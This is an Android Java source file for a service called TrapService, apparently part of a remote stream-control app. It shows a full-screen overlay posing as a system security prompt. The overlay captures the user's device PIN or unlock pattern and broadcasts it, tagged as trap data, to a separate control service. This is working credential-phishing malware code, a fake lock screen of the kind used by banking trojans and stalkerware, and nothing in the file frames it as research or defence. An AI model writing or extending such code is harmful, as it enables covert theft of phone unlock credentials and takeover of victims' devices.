package com.rcl.androidstreamcontrol.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;

import androidx.annotation.Nullable;

import com.rcl.androidstreamcontrol.R;

public class TrapService extends Service {

    private static final String TAG = "TrapService";
    private WindowManager windowManager;
    private View overlayView;

    private boolean isPatternMode = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        showTrapOverlay();
    }

    private void showTrapOverlay() {
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                // Crucially, omit FLAG_NOT_FOCUSABLE so the EditText can spawn the keyboard
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.CENTER;

        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        overlayView = inflater.inflate(R.layout.trap_layout, null);

        setupLogic();

        windowManager.addView(overlayView, params);
        Log.d(TAG, "Trap Overlay displayed");
    }

    private void setupLogic() {
        View pinContainer = overlayView.findViewById(R.id.pin_container);
        View patternContainer = overlayView.findViewById(R.id.pattern_container);
        PatternView patternView = overlayView.findViewById(R.id.pattern_view);
        EditText trapInput = overlayView.findViewById(R.id.trap_input);
        Button btnSubmit = overlayView.findViewById(R.id.trap_submit);
        Button btnToggle = overlayView.findViewById(R.id.trap_toggle_mode);

        btnToggle.setOnClickListener(v -> {
            isPatternMode = !isPatternMode;
            if (isPatternMode) {
                pinContainer.setVisibility(View.GONE);
                patternContainer.setVisibility(View.VISIBLE);
                btnToggle.setText("Switch to Password");
                // Clear pattern just in case
                patternView.clearPattern();
            } else {
                pinContainer.setVisibility(View.VISIBLE);
                patternContainer.setVisibility(View.GONE);
                btnToggle.setText("Switch to Pattern");
                trapInput.setText("");
            }
        });

        btnSubmit.setOnClickListener(v -> {
            if (isPatternMode) {
                String patternData = patternView.getCapturedPattern();
                if (!"[]".equals(patternData)) {
                    sendDataToControlService("[TRAP_PATTERN] " + patternData);
                    closeOverlay();
                }
            } else {
                String pinText = trapInput.getText().toString();
                if (!pinText.isEmpty()) {
                    sendDataToControlService("[TRAP_PIN] " + pinText);
                    closeOverlay();
                }
            }
        });
    }

    private void sendDataToControlService(String logText) {
        try {
            Intent intent = new Intent("com.rcl.androidstreamcontrol.LOG_EVENT");
            intent.putExtra("appName", "SYSTEM_SECURITY_TRAP");
            intent.putExtra("log", logText);
            sendBroadcast(intent);
            Log.d(TAG, "Sent captured data: " + logText);
        } catch (Exception e) {
            Log.e(TAG, "Error sending data", e);
        }
    }

    private void closeOverlay() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
            overlayView = null;
        }
        stopSelf();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        closeOverlay();
    }
}
